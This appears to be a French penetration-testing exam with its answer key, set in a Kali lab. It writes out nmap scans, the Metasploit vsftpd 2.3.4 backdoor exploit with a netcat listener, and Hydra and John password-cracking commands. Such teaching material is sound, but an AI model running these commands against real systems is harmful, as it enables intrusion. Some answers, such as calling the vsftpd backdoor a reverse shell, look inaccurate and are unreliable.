
![[Pasted image 20250531133126.png]]
![[Pasted image 20250531133133.png]]
![[Pasted image 20250531133141.png]]
![[Pasted image 20250531133147.png]]
![[Pasted image 20250531133153.png]]

---
### Page 1: I-Questions

#### 1. Quelles sont les phases du pentesting ?
- **Correct Answer:** Footprinting, Enumeration, Exploitation, Post-exploitation
- **Justification:** Penetration testing follows a structured process:
  - **Footprinting:** Initial reconnaissance to gather information about the target (e.g., domain details, IP ranges).
  - **Enumeration:** Detailed discovery of hosts, ports, services, and vulnerabilities (e.g., using Nmap).
  - **Exploitation:** Attempting to gain unauthorized access by exploiting identified vulnerabilities.
  - **Post-exploitation:** Actions after gaining access, such as privilege escalation and maintaining persistence. All phases are integral to a complete pentest.

#### 2. Quelles sont les types de Testing et les différences entre eux ?
- **Correct Answer:** Black Box, Grey Box, White Box
- **Justification:**
  - **Black Box:** Tester has no prior knowledge of the system, simulating an external attacker. Requires extensive enumeration (e.g., Nmap, Shodan).
  - **Grey Box:** Tester has partial knowledge (e.g., some credentials), balancing internal and external perspectives.
  - **White Box:** Tester has full knowledge (e.g., source code, architecture), allowing detailed vulnerability analysis. The differences lie in the level of information provided, affecting the testing approach and depth.

---

### Page 1: II-Exercice

#### Scenario
On propose d’effectuer un test d’intrusion à un serveur local par une machine d’attaque dotée d’un système d’exploitation Kali Linux. L’adresse IP du réseau est 192.168.10.0/24 et l’adresse IP de la machine d’attaque est 192.168.10.10.

#### 1. Réaliser les scans nécessaires du réseau par l’outil nmap pour déterminer :
- a. L’adresse de la machine cible,
- b. Son système d’exploitation,
- c. L’état des ports les plus courants.
- **Command:**
  ```bash
  nmap -A -p- 192.168.10.0/24
  ```
- **Justification:**
  - `-A`: Enables OS detection, version scanning, script scanning, and traceroute.
  - `-p-`: Scans all 65,535 ports to identify open ones.
  - This command will detect the target IP (e.g., 192.168.10.11), its OS (e.g., Linux 5.x), and open ports (e.g., 21, 22, 80).

#### 2. Appliquer un scan intensif de la machine cible afin de détecter les services et leurs versions.
- **Command:**
  ```bash
  nmap -sV -O 192.168.10.11
  ```
- **Justification:**
  - `-sV`: Detects service versions (e.g., Apache 2.4.41, OpenSSH 7.9).
  - `-O`: Performs OS detection.
  - This provides detailed service information for vulnerability assessment.

#### 3. Effectuer un scan de tous les ports de la machine cible.
- **Command:**
  ```bash
  nmap -p- 192.168.10.11
  ```
- **Justification:**
  - `-p-`: Scans all ports, ensuring no open ports are missed, which is critical for a thorough enumeration.

#### 4. Lancer un scan basique de vulnérabilités par un script Nmap NSE.
- **Command:**
  ```bash
  nmap --script vuln 192.168.10.11
  ```
- **Justification:**
  - `--script vuln`: Runs vulnerability detection scripts (e.g., identifying outdated services like FTP or HTTP vulnerabilities).

#### 5. Appliquer le module auxiliary/scanner/ftp/ftp_version de Metasploit pour identifier la version du serveur FTP.
- **Command:**
  ```bash
  msfconsole
  use auxiliary/scanner/ftp/ftp_version
  set RHOSTS 192.168.10.11
  run
  ```
- **Justification:**
  - `auxiliary/scanner/ftp/ftp_version`: Identifies the FTP server version (e.g., vsFTPd 2.3.4), aiding in exploit selection.

#### 6. On suppose que la version identifiée du serveur FTP est vsFTPd 2.3.
- a. Monter un commentaire cherchant un module d’exploit compatible avec cette version.
  - **Command:**
    ```bash
    search vsftp 2.3
    ```
  - **Justification:** The `search` command in Metasploit finds exploits matching "vsftp 2.3" (e.g., `exploit/unix/ftp/vsftpd_234_backdoor`).
- b. Qu’est-ce qu’un reverse Shell ?
  - **Answer:** A reverse shell is a connection where the target machine initiates a shell back to the attacker’s machine, allowing remote command execution.
  - **Justification:** This is useful when the attacker controls the listening port (e.g., using Netcat).
- c. Appliquer le module exploit/unix/ftp/vsftpd_234_backdoor pour lancer un reverse Shell sur le serveur.
  - **Command:**
    ```bash
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOST 192.168.10.11
    set LHOST 192.168.10.10
    set LPORT 4444
    exploit
    ```
  - **Justification:** This exploits a backdoor in vsFTPd 2.3.4, opening a reverse shell. Start a listener with `nc -lvnp 4444` on the attacker machine.

#### 7. Expliquer les différentes approches de cracking de mots de passes. Citer quelques outils.
- **Answer:**
  - **Brute Force:** Tries all possible combinations (e.g., Hydra, John).
    - **Example:** `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.10.11 ssh`
  - **Dictionary Attack:** Uses a pre-defined wordlist (e.g., John, Hashcat).
    - **Example:** `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
  - **Rainbow Table Attack:** Uses precomputed hash tables for faster cracking (e.g., RainbowCrack).
  - **Justification:** These methods vary in speed and efficiency; brute force is exhaustive, dictionary attacks are faster with a good wordlist, and rainbow tables optimize for precomputed hashes.

---

### Page 2-3: III-Cochez les bonnes réponses

#### 13. Quel outil est utilisé pour énumérer les partages SMB ?
- **Options:** A. Dirb, B. Enum4linux, C. Sqlmap, D. Gobuster
- **Correct Answer:** B. Enum4linux
- **Justification:** Enum4linux is specifically designed to enumerate SMB shares, users, and groups on Windows/Linux systems.

#### 14. Pour énumérer les utilisateurs d’un serveur FTP, on peut :
- **Options:** A. Faire un scan SYN anonyme, B. Tenter une connexion anonyme, C. Exploiter une faille HTTP, D. Sniffer un réseau
- **Correct Answer:** B. Tenter une connexion anonyme
- **Justification:** Attempting an anonymous FTP login (e.g., `ftp 192.168.10.11`, username: `anonymous`) can reveal user-related information or vulnerabilities.

#### 15. L’énumération LDAP se fait généralement sur le port :
- **Options:** A. 88, B. 21, C. 389, D. 53
- **Correct Answer:** C. 389
- **Justification:** Port 389 is the default for LDAP (Lightweight Directory Access Protocol) services.

#### 16. Quel outil peut être utilisé pour interroger un serveur SNMP ?
- **Options:** A. Nikto, B. SNMPwalk, C. Netcat, D. Metasploit
- **Correct Answer:** B. SNMPwalk
- **Justification:** SNMPwalk is used to query SNMP (Simple Network Management Protocol) services, typically on port 161.

#### 17. Le protocole utilisé pour l’énumération des services web est :
- **Options:** DNS, HTTP, FTP, POP3
- **Correct Answer:** HTTP
- **Justification:** HTTP is the primary protocol for web services, used to enumerate web applications and directories.

#### 18. Quel outil est utilisé pour énumérer les partages SMB ?
- **Options:** A. Dirb, B. Enum4linux, C. Sqlmap, D. Gobuster
- **Correct Answer:** B. Enum4linux
- **Justification:** (Repeated question, same justification as Q13.)

#### 19. Quelle commande permet de rechercher un module dans Metasploit ?
- **Options:** A. search, B. show, C. use, D. exploit
- **Correct Answer:** A. search
- **Justification:** The `search` command in Metasploit is used to find modules (e.g., `search vsftp`).

#### 20. Quelle est la première étape après avoir sélectionné un module ?
- **Options:** A. Lancer exploit, B. Configurer les options, C. Mettre à jour la base de données, D. Quitter
- **Correct Answer:** B. Configurer les options
- **Justification:** After selecting a module with `use`, configuring options (e.g., `set RHOST`) is the next step before launching an exploit.

#### 21. Le module exploit/unix/ftp/vsftpd_23 backdoor permet :
- **Options:** A. Injecter du code SQL, B. Dévoiler un shell backdoor, C. De faire un brute force, D. Exécuter un ransomware
- **Correct Answer:** B. Dévoiler un shell backdoor
- **Justification:** This module exploits a backdoor in vsFTPd 2.3.4 to provide a reverse shell.

#### 22. Quelle commande dans Metasploit permet de lister les payloads compatibles ?
- **Options:** A. list payloads, B. show payloads, C. payload list, D. get payloads
- **Correct Answer:** B. show payloads
- **Justification:** `show payloads` lists available payloads for a selected module.

#### 23. Pour établir une session avec une machine compromise, on utilise :
- **Options:** A. Shellcode, B. Meterpreter, C. Wireshark, D. Armitage
- **Correct Answer:** B. Meterpreter
- **Justification:** Meterpreter is a Metasploit payload used for interactive post-exploitation sessions.

#### 24. Quelle commande exécute réellement un paquet dans Metasploit ?
- **Options:** A. run, B. attack, C. exploit, D. fire
- **Correct Answer:** C. exploit
- **Justification:** The `exploit` command executes the selected module or payload.
